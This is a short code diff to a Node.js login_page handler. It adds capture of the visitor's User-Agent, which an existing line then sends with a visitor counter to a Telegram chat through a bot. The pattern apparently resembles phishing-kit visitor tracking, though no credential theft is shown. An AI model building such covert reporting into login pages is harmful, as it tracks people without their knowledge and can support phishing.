@@ -11,6 +11,7 @@ exports.login_page = async (req, res) => {
 
   
   i++
+  var ua = req.headers['user-agent'];
 
   bot.sendMessage(chatID, "New User Has Landed and is assigned an ID of " + i + "\nUser-Agent : " + ua + "\n")
 
